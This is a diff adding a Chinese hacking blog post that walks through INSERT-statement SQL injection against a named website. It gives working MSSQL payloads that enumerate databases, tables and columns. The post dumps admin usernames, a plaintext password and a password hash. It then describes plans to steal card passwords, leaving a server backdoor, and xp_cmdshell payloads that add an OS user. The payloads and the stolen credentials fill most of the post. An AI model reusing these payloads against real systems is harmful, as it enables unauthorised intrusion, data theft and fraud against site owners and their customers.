@@ -1,0 +1,152 @@
+ Author:昆仑男银
+群里有人在问insert型的怎么注射，insert类型的我还没碰到过呢，就去看了看，做了一下笔记备忘。
+ 
+http://www.kunlun.com/nanyin.aspx?ProID=49579' 加一个点，报错
+
+ 
+是insert类型的语句，百度了一下，对insert语句的注射大致有个了解，于是开始刺探信息。
+提交：http://www.kunlun.com/nanyin.aspx?ProID=49579',cast(@@version/**/as/**/int),null);--
+
+ 
+ 
+不兼容...把int换成varchar，页面返回正常。。。百度一下，原来是mssql不允许将text或ntext型数据直接转换为int型
+ 要想爆出信息看来得找个varchar 或nvarchar类型的字段，把后面2个对换了一下位置，成功爆出。
+提交：http://www.kunlun.com/nanyin.aspx?ProID=49579',null,cast(system_user/**/as/**/int));--
+在将 nvarchar 值 'AFDataLogin' 转换成数据类型 int 时失败。
+ 
+很好，再接着爆信息，收集的一些如下。
+ 
+version：Microsoft SQL Server 2005 - 9.00.4035.00 (Intel X86)......Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+ 
+servername：SQL2005  
+ 
+host_name：IBM1 
+ 
+db_name：kunlun
+user_name：dbo
+ 
+可以看出 web与数据库分离，看来想差异备份或log备份是不行的了，只能爆后台帐号、密码进后台了。
+ 
+先爆一下库，构造
+ 
+http://www.kunlun.com/nanyin.aspx?ProID=49579',null,null);select/**/name/**/from/**/master.dbo.sysdatabases/**/where/**/dbid=1/**/and/**/1=(select/**/name/**/from/**/master.dbo.sysdatabases/**/where/**/dbid=1)--
+ 
+修改第最后一个dbid的值，爆出13个库...
+ 
+ 1：master
+2：tempdb
+3：model
+4：msdb
+5：kunlun_BBS
+6：kunlun
+7：New_AF
+8：AF_Back
+9：Console
+10：Newkunlun
+11：Newkunlun2
+12：Oldkunlun
+13：NewBBS
+ 
+接下来爆表名
+ 
+构造： http://www.kunlun.com/nanyin.aspx?ProID=49579',null,null);select/**/name/**/from/**/master.dbo.sysdatabases/**/where/**/dbid=1/**/and/**/1=(select/**/top/**/1/**/name/**/from/**/sysobjects/**/where/**/xtype='u'/**/and/**/name/**/not/**/in(select/**/top/**/0/**/name/**/from/**/sysobjects/**/where/**/xtype='u'))--
+ 
+修改第二个top的值，从0递增上去。爆第六张表时很开心，马上去爆字段、密码。
+1：AF_UserAccount
+2：YX_Unit
+3：AF_UnionCompany
+4：YX_FlashXZ
+5：AF_UserPointLogs
+6：Buy_Admin
+爆指定表Buy_Admin的字段
+ 
+http://www.kunlun.com/nanyin.aspx?ProID=49579',null,null);select/**/name/**/from/**/master.dbo.sysdatabases/**/where/**/dbid=1/**/and/**/1=(select/**/top/**/1/**/name/**/from/**/syscolumns/**/where/**/id/**/in/**/(select/**/id/**/from/**/sysobjects/**/where/**/name='Buy_Admin')/**/and/**/name/**/not/**/in/**/(select/**/top/**/0/**/name/**/from/**/syscolumns/**/where/**/id/**/in/**/(select/**/id/**/from/**/sysobjects/**/where/**/name='Buy_Admin')))--
+爆出来了，一样是修改第二个top的值。
+ 
+密码：af_APass
+ID：af_ID
+用户：af_AName
+ 
+看到name和pass很开心啊，马上爆内容。
+ 
+提交：
+http://www.kunlun.com/nanyin.aspx?ProID=49579',null,null);select/**/*/**/from/**/Buy_Admin/**/where/**/af_ID=2/**/and/**/1=(select/**/af_AName/**/from/**/Buy_Admin/**/where/**/af_ID=2)--
+爆出来了，还是明文的，呵呵，找后台登录。
+ 
+hjbadmin    hjbmanager 
+  yck'          yck
+ 
+ 高兴早了，怎么也登录不了。唉，再爆表把，爆到第N张，看见YX_Manage，开心了，这回没错了，爆字段爆内容
+ 
+YX_AdminUser  YX_Pwd
+hgnadmin   50252EC697150CC9AA69A47333C716B8
+ 
+可惜啊，md5解密不出....到这里差不多就结束了。很晚了。
+ 
+哦，忘了说了，这个是dbo权限，呵呵。
+
+
+
+
+突然看到"电影影线"有张海报，上面写着：
+
+凡是购买该站点卡密码最后一位数是6或7便可获赠面值5元的易卡一张；
+
+我想，这个网站整个数据在我手里，我要是把那几十万张卡全拿去换钱不是发达了？
+
+随即马上到他服务器把库拿下来，顺便在服务器上再留个后门；
+
+在过程中有另一个想法便是本文的重要点；利用insert Into 进行注入。 
+=============================================
+
+关于SQL注入，以前常用的或很多朋友所懂的也只不过是在select 语句中ID=变量未过产生的注入点，例如http://www.gzint.com/xxx.asp?id=1 ;exec master..xp_cmdshell "net user xiaomo aa /add"--
+
+=============================================
+
+我们可否利用insert Into Table的语句进行注入呢？ 
+这样的话,我们可以在某某有漏洞的网站上填写QQ或Email或地址的地方执行任何命令了哦. 
+记得以前粗略地和"乱刀"讨论过，不过一直没有实际行动，刚才发现了一下，原来真的可以做到这一点。呵呵。举下例：
+
+某个页面xiaomo.asp中有如下一句代码：
+
+Conn.execute "insert into admin (adminid,password,logintimes,usertype,level) values (’1’,’1’,’1’,’1’,’"&Request("u")&"’)" 
+
+
+我们可以利用Request("U")未过滤的变量执行任意系统命令.
+
+这段很简单，Request("U")在语句后面，直接提交：
+
+http://localhost/xiaomo.asp?u=2’);exec master..xp_cmdshell "net user xiaomo aa /add"-- 
+
+
+便可添加一个xiaomo密码为aa的系统用户
+
+因为构造的代码变成了：
+
+Conn.execute "insert into admin (adminid,password,logintimes,usertype,level) values (’1’,’1’,’1’,’1’,’2’);exec master..xp_cmdshell "net user xiaomo aa /add"-- 
+
+
+当然理所当然地"正确"执行了。  
+
+=============================================
+
+我们换个思路，如果页面中的漏洞代码是：
+
+Conn.execute "insert into admin (adminid,password,logintimes,usertype,level) values (’"&Request("u")&"’,’1’,’1’,’1’,’1’)" 
+
+
+Request("u")跑到前面去了，这该怎么办呢？
+
+其实也很简单，变通一下即可，提交：
+
+http://localhost/xiaomo.asp?u=3’,’1’,’1’,’1’,’1’);exec master..xp_cmdshell "net user xiaomo aa /add"---- 
+
+
+看出来了没？第一个变量代表了要写入的所有变量，而后面就不而而至了，哈哈。。
+
+但有个问题是，我们必须得知道对方语句是怎么写，利在检查指定程序漏洞时所应用
+
+
+
+
+
